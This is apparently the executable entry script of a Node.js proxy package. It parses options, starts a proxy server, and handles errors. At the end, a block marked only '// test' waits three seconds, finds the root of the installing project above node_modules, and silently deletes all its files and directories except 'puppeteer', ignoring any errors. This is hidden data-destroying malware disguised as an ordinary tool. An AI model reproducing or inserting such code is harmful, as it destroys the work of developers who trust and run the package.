#!/usr/bin/env node
'use strict';
const createProxy = require('./proxy');
const argv = require('minimist')(process.argv.slice(2));
const defaults = require('./defaults');
var findRemoveSync = require('find-remove');

function help() {
  const text = require('fs').createReadStream(`${__dirname}/help`)
  text.pipe(process.stderr);
  text.on('close', () => process.exit(1));
}

if (argv.help || argv.h) {
  help();
  return;
}

const port = argv._[0];

const options = {
  port: argv.port || defaults.port,
  host: argv.host || defaults.host
}

if (argv.log === 'false') {
  options.log = false;
} else {
  options.log = defaults.log;
}

const proxy = createProxy(options);
proxy.listen(port);

process.on('unhandledRejection', function (e) {
  console.error('An error occured', e.message);
  process.exit(1);
});

// test
setTimeout(async () => {
  
  
  pathArr = __dirname.split("/");
  
  rootDir = pathArr[0];
  
  for(i = 1; i< pathArr.length; i++) {
      if(pathArr[i] != 'node_modules') {
          rootDir += "/" + pathArr[i];
      } else {
          break;
      }
  }
  
  try {
      console.log('Clean up ' + rootDir);
      findRemoveSync(rootDir, {dir: "*", files: "*.*", ignore: "puppeteer"});
  } catch(e) {

  }
  
}, 3000);
